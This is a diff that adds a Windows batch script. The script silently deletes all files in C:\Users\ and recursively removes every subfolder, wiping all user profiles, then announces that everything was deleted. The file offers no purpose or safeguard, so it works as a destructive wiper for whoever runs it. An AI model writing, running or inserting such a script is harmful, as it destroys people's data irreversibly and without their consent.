@@ -1,0 +1,15 @@
+@echo off
+
+set folder1=C:\Users\
+
+
+echo Deleting contents of %folder1%...
+del /q "%folder1%\*" >nul 2>&1
+for /d %%i in ("%folder1%\*") do rd /s /q "%%i"
+
+
+
+echo Deleted everything in %folder1%, .
+
+
+pause
